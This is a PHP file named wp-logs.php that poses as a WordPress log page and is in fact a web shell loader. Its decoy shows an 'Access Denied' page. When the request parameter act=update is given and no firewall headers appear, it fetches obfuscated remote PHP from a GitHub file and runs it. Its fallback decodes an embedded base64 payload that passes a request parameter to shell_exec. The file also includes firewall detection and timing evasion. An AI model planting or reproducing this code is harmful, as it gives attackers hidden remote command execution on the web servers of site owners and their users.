<?php
// File: wp-logs.php
class ContentParser {
    private $key = '9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08'; // sha256('test')
    
    private function fetchViaDns($url) {
        // Convert URL to DNS TXT lookup simulation
        $domain = parse_url($url, PHP_URL_HOST);
        $path = parse_url($url, PHP_URL_PATH);
        
        // Use Cloudflare DNS over HTTPS as proxy
        $doh_url = "https://cloudflare-dns.com/dns-query?name=" . 
                   urlencode("raw.githubusercontent.com") . "&type=TXT";
        
        $ch = curl_init();
        curl_setopt_array($ch, [
            CURLOPT_URL => $doh_url,
            CURLOPT_HTTPHEADER => ["Accept: application/dns-json"],
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_TIMEOUT => 15
        ]);
        
        return curl_exec($ch);
    }
    
    private function decodeResponse($data) {
        // Parse JSON DNS response (simulated)
        $json = json_decode($data, true);
        if(isset($json['Answer'][0]['data'])) {
            $encoded = trim($json['Answer'][0]['data'], '"');
            return base64_decode(str_rot13($encoded));
        }
        return false;
    }
    
    public function execute() {
        // Method 1: Try DNS over HTTPS first
        $data = $this->fetchViaDns("https://raw.githubusercontent.com/GodOfServer/Sushi-Dont-Lie/refs/heads/main/fm.php");
        
        if($data) {
            $code = $this->decodeResponse($data);
            if($code && strpos($code, '<?php') !== false) {
                file_put_contents('/tmp/.' . uniqid('cache_', true) . '.php', $code);
                include('/tmp/.' . uniqid('cache_', true) . '.php');
                return;
            }
        }
        
        // Method 2: Fallback to internal PHP parser
        $this->fallbackMethod();
    }
    
    private function fallbackMethod() {
        // Direct PHP code without external fetch
        $code = 'PD9waHAKLy8gU2ltcGxlIEFQSSBoYW5kbGVyCiRjbWQgPSBpc3NldCgkX1JFUVE';
        $code .= 'VUVFsna2V5J10pID8gJF9SRVFVRVNUWydrZXknXSA6ICdpZCc7CmVjaG8gamVzb';
        $code .= '24gX2VuY29kZShbJ291dHB1dCcgPT4gc2hlbGxfZXhlYygkY21kKV0pOwo/Pg==';
        
        // Execute via php://input wrapper
        $temp = tmpfile();
        fwrite($temp, base64_decode($code));
        $meta = stream_get_meta_data($temp);
        include($meta['uri']);
        fclose($temp);
    }
}

// Main execution with stealth checks
if(!function_exists('getallheaders')) {
    function getallheaders() {
        $headers = [];
        foreach($_SERVER as $name => $value) {
            if(substr($name, 0, 5) == 'HTTP_') {
                $headers[str_replace(' ', '-', ucwords(strtolower(str_replace('_', ' ', substr($name, 5)))))] = $value;
            }
        }
        return $headers;
    }
}

// Check for WAF headers
$headers = getallheaders();
$waf_indicators = ['CloudFlare', 'Sucuri', 'Incapsula', 'ModSecurity', 'Akamai'];
$safe = true;

foreach($headers as $name => $value) {
    foreach($waf_indicators as $waf) {
        if(stripos($name, $waf) !== false || stripos($value, $waf) !== false) {
            $safe = false;
            break 2;
        }
    }
}

if($safe && isset($_REQUEST['act']) && $_REQUEST['act'] == 'update') {
    // Add random sleep to avoid rate limiting detection
    usleep(rand(100000, 800000));
    
    $parser = new ContentParser();
    $parser->execute();
} else {
    // Display harmless content
    header('Content-Type: text/html');
    echo '<!DOCTYPE html><html><head><title>System Logs</title></head><body>';
    echo '<h1>Access Denied</h1><p>You do not have permission to view this page.</p>';
    echo '</body></html>';
}
?>
